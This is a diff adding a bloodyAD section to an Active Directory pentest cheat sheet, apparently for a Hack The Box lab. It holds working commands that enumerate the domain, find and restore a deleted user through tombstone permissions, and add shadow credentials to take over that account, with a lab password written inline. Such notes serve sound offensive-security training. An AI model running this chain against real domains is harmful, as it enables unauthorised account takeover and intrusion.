@@ -90,6 +90,38 @@ bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -n
 
 ## bloodyAD
 
+Bloodhound collector
+```bash
+bloodyAD --host 10.129.17.23 -d DC01.checkpoint.htb -u $username -p $password get bloodhound
+```
+
+Writable objects:
+```bash
+bloodyAD --host 10.129.17.23 -d DC01.checkpoint.htb -u $username -p $password get writable
+```
+
+
+Tombstone / Deleted Objects:
+https://cravaterouge.com/articles/ad-bin/
+```bash
+bloodyAD -u 'alex.turner' -d DC01.checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name
+
+# Find `ObjectType` to be `Reanimate-Tombstone:
+bloodyAD -u 'alex.turner' -d DC01.checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 get object 'DC=checkpoint,DC=htb' --attr ntsecuritydescriptor --resolve-sd
+
+# Find `Generic Write` right on the deleted object:
+bloodyAD -u 'alex.turner' -d DC01.checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 get search -c 1.2.840.113556.1.4.2064 --filter '(&(isDeleted=TRUE)(sAMAccountName=mark.davies))' --attr ntsecuritydescriptor --resolve-sd
+
+# Create Child right on the OU used for restoration
+bloodyAD -u 'alex.turner' -d DC01.checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 get object 'CN=mark.davies,DC=checkpoint,DC=htb' --attr ntsecuritydescriptor --resolve-sd
+
+# Restore deleted object
+bloodyAD -u 'alex.turner' -d DC01.checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+
+# Add shadow credentials
+bloodyAD -u 'alex.turner' -d checkpoint.htb -p 'Checkpoint2024!' --host 10.129.17.23 add shadowCredentials 'mark.davies'
+```
+
 > [https://github.com/CravateRouge/bloodyAD/wiki/User-Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
 
 > [https://github.com/CravateRouge/bloodyAD/wiki/Access-Control](https://github.com/CravateRouge/bloodyAD/wiki/Access-Control)
